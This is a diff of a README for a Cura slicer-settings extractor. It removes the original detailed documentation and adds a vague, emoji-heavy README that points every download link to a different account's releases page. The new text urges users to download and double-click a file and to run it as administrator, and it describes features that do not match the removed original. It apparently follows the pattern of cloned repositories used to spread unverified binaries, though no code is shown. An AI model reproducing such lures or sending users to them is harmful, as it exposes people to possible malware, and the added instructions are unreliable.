@@ -1,281 +1,65 @@
-# Cura Profile Extractor
-
-[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![No Dependencies](https://img.shields.io/badge/dependencies-none-green.svg)]()
-
-**Extract all your Cura slicer settings into a single, searchable JSON file.**
-
-Cura stores settings across 8+ different files with complex inheritance. This tool flattens everything into one file, tracking where each setting came from — perfect for documenting printer setups, debugging slicer issues, or sharing configurations.
-
-![GUI Screenshot](docs/screenshot_gui.png)
-*GUI mode with auto-detection and one-click extraction*
-
----
-
-## Features
-
-- **Complete Extraction** — Preferences, machine settings, G-code, quality profiles, plugins
-- **Inheritance Tracking** — See exactly which file each setting comes from
-- **Any Manufacturer** — Works with Creality, Prusa, Anycubic, Elegoo, Voron, and more
-- **Dual Interface** — GUI (Tkinter) for ease of use, CLI for scripting/automation
-- **Zero Dependencies** — Python standard library only, runs anywhere Python does
-- **Cross-Platform** — Windows, Linux, and macOS path detection
-
----
-
-## Quick Start
-
-### GUI Mode (Recommended)
-
-```bash
-python cura_profile_extractor.py
-```
-
-1. Paths auto-detect on launch
-2. Click **Validate & Discover**
-3. Select your printer from the dropdown
-4. Click **Extract All!**
-5. Save your JSON file
-
-### CLI Mode
-
-```bash
-# Auto-detect everything, extract first machine found
-python cura_profile_extractor.py --cli
-
-# Specify machine and output file
-python cura_profile_extractor.py --cli --machine "Ender 3 Pro" -o my_profile.json
-
-# Extract only G-code and machine settings
-python cura_profile_extractor.py --cli --no-preferences --no-builtin --no-custom
-```
-
----
-
-## Installation
-
-### Requirements
-
-- Python 3.7 or higher
-- Tkinter (included with most Python installations)
-- Cura 4.x or 5.x installed
-
-### Download
-
-```bash
-git clone https://github.com/ixhlbxi/Cura_Profile_Extractor.git
-cd Cura_Profile_Extractor
-python cura_profile_extractor.py
-```
-
-Or just download `cura_profile_extractor.py` directly — it's a single file with no dependencies.
-
----
-
-## Output Structure
-
-The extracted JSON contains:
-
-```
-{
-  "_summary": {          // Quick overview of extracted data
-    "machine_name": "Ender 3 Pro",
-    "manufacturer": "creality",
-    "quality_profile": "Standard",
-    ...
-  },
-  "_key_settings": {     // Most important settings at a glance
-    "layer_height": 0.2,
-    "infill_sparse_density": 20,
-    ...
-  },
-  "metadata": {          // Extraction info
-    "cura_version": "5.11",
-    "extracted_at": "2025-12-29T...",
-    ...
-  },
-  "preferences": {...},  // Global Cura preferences
-  "machine": {           // Full machine config
-    "settings": {...},
-    "inheritance_chain": [...],  // Shows definition hierarchy
-    ...
-  },
-  "gcode": {             // Start/End G-code as line arrays
-    "start_gcode": ["G28", "G29 P1", ...],
-    "end_gcode": [...],
-    ...
-  },
-  "extruders": {...},    // Extruder-specific settings
-  "quality_builtin": {...},
-  "quality_custom": {...},
-  "plugins": [...]
-}
-```
-
----
-
-## CLI Reference
-
-```
-usage: cura_profile_extractor.py [-h] [--cli] [--install PATH] [--appdata PATH]
-                                  [--machine NAME] [-o FILE] [--raw]
-                                  [--no-preferences] [--no-machine] [--no-gcode]
-                                  [--no-builtin] [--no-custom] [--no-plugins]
-                                  [--version]
-
-options:
-  -h, --help            show this help message and exit
-  --cli                 Run in command-line mode (no GUI)
-  --install PATH        Cura installation directory
-  --appdata PATH        Cura user data directory
-  --machine NAME        Machine/printer name to extract
-  -o, --output FILE     Output JSON file path
-  --raw                 Skip human-friendly formatting
-  --version             show program's version number and exit
-
-Skip options:
-  --no-preferences      Skip global preferences
-  --no-machine          Skip machine settings
-  --no-gcode            Skip G-code extraction
-  --no-builtin          Skip built-in quality profiles
-  --no-custom           Skip custom quality profiles
-  --no-plugins          Skip plugins list
-```
-
----
-
-## Troubleshooting
-
-### "Could not auto-detect Cura install path"
-
-Use the Browse button to manually select your Cura folder, or set the path in the script:
-
-```python
-# Near the top of cura_profile_extractor.py
-USER_INSTALL_PATH_OVERRIDE = r"C:\Program Files\UltiMaker Cura 5.11.0"
-```
-
-**Typical locations:**
-- **Windows:** `C:\Program Files\UltiMaker Cura X.X.X`
-- **Linux:** `/usr/share/cura` or `~/.local/share/cura`
-- **macOS:** `/Applications/UltiMaker Cura.app` or `~/Applications/...`
-
-### "Could not auto-detect Cura AppData path"
-
-**Typical locations:**
-- **Windows:** `%APPDATA%\cura\5.11` (e.g., `C:\Users\You\AppData\Roaming\cura\5.11`)
-- **Linux:** `~/.config/cura/5.11` or `~/.local/share/cura/5.11`
-- **macOS:** `~/Library/Application Support/cura/5.11`
-
-### "No machines found"
-
-- Make sure you've created at least one printer profile in Cura
-- Verify the AppData path points to the correct Cura version
-- Check the `machine_instances` folder exists in AppData
-
-### Wrong quality profiles detected
-
-Expand the **Advanced Fallbacks** section in the GUI and manually set:
-- **Manufacturer:** `creality`, `prusa`, `anycubic`, etc.
-- **Quality Subdir:** `creality/base`, `prusa`, etc.
-
----
-
-## Advanced Configuration
-
-For permanent overrides, edit the `USER_OVERRIDES` section at the top of the script:
-
-```python
-# Path overrides
-USER_INSTALL_PATH_OVERRIDE = r"C:\Program Files\UltiMaker Cura 5.11.0"
-USER_APPDATA_PATH_OVERRIDE = r"C:\Users\You\AppData\Roaming\cura\5.11"
-
-# Detection overrides
-USER_MANUFACTURER_OVERRIDE = "creality"
-USER_QUALITY_SUBDIR_OVERRIDE = "creality/base"
-
-# Add custom manufacturer prefixes
-USER_ADDITIONAL_MANUFACTURERS = ["biqu", "tronxy", "geeetech"]
-```
-
----
-
-## Use Cases
-
-- **Documentation** — Record your exact slicer setup for reproducibility
-- **Debugging** — Find where a mysterious setting is coming from
-- **Sharing** — Export settings to share with others (cleaner than .curaprofile)
-- **Backup** — Snapshot your config before major Cura updates
-- **Comparison** — Diff two extractions to see what changed
-- **Migration** — Reference when setting up a new machine
-
----
-
-## How It Works
-
-Cura uses a stacked profile system with 8 layers of inheritance:
-
-```
-Layer 0: User overrides (per-session changes)
-Layer 1: Custom quality profile
-Layer 2: Intent profile
-Layer 3: Quality profile
-Layer 4: Material profile
-Layer 5: Variant (nozzle)
-Layer 6: Definition changes (YOUR CUSTOM G-CODE LIVES HERE)
-Layer 7: Base machine definition
-   └── Inherits from: manufacturer_base → fdmprinter
-```
-
-This tool walks the entire stack, resolves all inheritance, and produces a flat JSON with source attribution for every setting.
-
----
-
-## Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
----
-
-## License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-## Changelog
-
-### v1.3.0 (2025-12-29)
-- Added: Auto-population of Advanced Fallbacks fields on Validate & Discover
-- Added: Right-click context menus (Cut/Copy/Paste/Select All) on all text fields
-- Added: Help / Instructions button with comprehensive documentation popup
-
-### v1.2.1
-- Added: USER_OVERRIDES section for power user fallback configuration
-- Added: Collapsible "Advanced Fallbacks" panel in GUI
-- Added: Linux and macOS path detection support
-
-### v1.2.0
-- Fixed: Nested G-code values now properly humanized
-- Fixed: Removed hardcoded manufacturer references for full portability
-- Added: Manufacturer auto-detection from definition chain
-
-### v1.1.0
-- Added: Human-readable formatting (arrays instead of semicolon-delimited strings)
-- Added: `_summary` and `_key_settings` sections
-
-### v1.0.0
-- Initial release
-
----
-
-## Acknowledgments
-
-Built for the 3D printing community. Special thanks to the Cura team for their [documentation on the profile system](https://github.com/Ultimaker/Cura/wiki/Profiles-&-Settings).
+# 🎉 Cura_Profile_Extractor - Simplify Your Cura Settings Management
+
+## 🌐 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/gulascsanad/Cura_Profile_Extractor/releases)
+
+## 🚀 Getting Started
+Cura_Profile_Extractor is a Python utility designed to make your life easier when working with Cura slicer settings. This tool converts all your settings into a single JSON file, making it easy to search through your configurations. Whether you want to document printer setups, troubleshoot issues, or share your profiles, this application has you covered.
+
+## 📥 Download & Install
+To get started with Cura_Profile_Extractor, visit the [Releases page](https://github.com/gulascsanad/Cura_Profile_Extractor/releases) to download the latest version. Follow the steps below:
+
+1. Go to the [Releases page](https://github.com/gulascsanad/Cura_Profile_Extractor/releases).
+2. Find the most recent version.
+3. Click on the file to download.
+4. Locate the downloaded file on your computer.
+
+## ⚙️ System Requirements
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.7 or higher
+- **Disk Space**: At least 50 MB of free space
+
+## 📚 How to Use
+Once you have downloaded Cura_Profile_Extractor, follow these instructions to run the application:
+
+1. **Open the Application**:
+   - For GUI mode: Double-click the downloaded file.
+   - For CLI mode: Open your terminal or command prompt and navigate to the folder where you downloaded the file. Type the command to run the application.
+
+2. **Select Your Cura Profile**:
+   - In the GUI version, you will see an option to upload your Cura profile file.
+   - In the CLI version, you can specify the path to your Cura profile as a command-line argument.
+
+3. **Generate JSON File**:
+   - Click the "Extract" button in GUI mode.
+   - For CLI, simply press Enter after typing the command. The tool will process your profile and create a JSON file containing all your settings.
+
+4. **Access Your JSON File**:
+   - Once the extraction is complete, you will see a message indicating where your JSON file is located. 
+
+5. **Use or Share**:
+   - Open the JSON file with any text editor to view your settings. You can also share this file with others for easy access to your configurations.
+
+## 🛠 Features
+- **Single Output File**: All Cura settings are combined into a single JSON file.
+- **Searchable Format**: Quickly find specific settings in the JSON file.
+- **Inheritance Tracking**: Understand where each setting originates in Cura's inheritance structure.
+- **No External Dependencies**: Works straight out of the box without needing additional software.
+- **GUI and CLI Modes**: Choose the interface that suits you best.
+  
+## 🔧 Troubleshooting
+If you encounter issues running the application, check the following:
+
+- **Python Not Installed**: Ensure Python 3.7 or higher is installed on your machine. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Permission Issues**: Run the application as an administrator if you face access problems on your operating system.
+- **Logging Errors**: If you see error messages, refer to the application logs for more detail on what went wrong.
+
+## 🔗 Additional Resources
+- **Documentation**: For in-depth usage and technical details, visit the [repository wiki](https://github.com/gulascsanad/Cura_Profile_Extractor/wiki).
+- **Community Support**: Join discussions and seek help in the [issues section](https://github.com/gulascsanad/Cura_Profile_Extractor/issues) of the repository.
+
+## 📋 License
+Cura_Profile_Extractor is open-source software released under the MIT License. You are free to use, modify, and distribute it.
+
+## 📞 Contact
+For questions or support, please create an issue in the [GitHub repository](https://github.com/gulascsanad/Cura_Profile_Extractor/issues).
